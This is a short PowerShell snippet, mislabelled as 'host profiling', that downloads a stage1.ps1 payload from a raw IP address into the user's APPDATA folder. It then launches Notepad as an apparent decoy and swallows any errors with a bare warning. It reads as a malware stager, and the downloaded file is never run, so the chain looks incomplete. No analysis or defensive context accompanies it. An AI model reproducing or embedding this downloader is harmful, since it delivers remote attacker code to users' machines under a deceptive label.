
<# Host profiling #> try { (New-Object System.Net.WebClient).DownloadFile('https://203.0.113.81:443/stage1.ps1', "$env:APPDATA\stage2.bin"); Start-Process -FilePath 'notepad.exe'; $StageMarker = "stage-37"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { Write-Warning "Remote fetch failed" }
